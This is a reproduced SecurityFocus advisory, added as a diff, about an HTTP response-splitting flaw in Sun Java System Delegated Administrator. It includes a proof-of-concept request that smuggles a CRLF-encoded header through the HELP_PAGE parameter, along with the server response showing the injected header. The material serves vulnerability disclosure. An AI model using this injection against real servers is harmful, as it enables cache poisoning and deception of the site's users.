@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/34643/info
+
+Sun Java System Delegated Administrator is prone to an HTTP response-splitting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Attackers can leverage this issue to influence or misrepresent how web content is served, cached, or interpreted. This could aid in various attacks that try to entice client users into a false sense of trust.
+
+The following example HTTP session is available:
+
+$ openssl s_client -connect <server>:443
+
+GET
+/da/DA/Login?Login.HelpHREF=http://www.example.com/&com_sun_web_ui_popup=false&HELP_PAGE=/help/%0AX-Tag:%20Core%20Security%20Technologies%0A%0D&jato.pageSession=
+HTTP/1.1
+Host: <server>
+
+HTTP/1.1 302 Moved Temporarily
+Server: Sun-Java-System-Web-Server/7.0
+Date: Mon, 20 Apr 2009 18:21:48 GMT
+Cache-control: private
+Location: <server>
+X-Tag: Core Security Technologies
+Content-length: 0
+Content-type: text/htm 
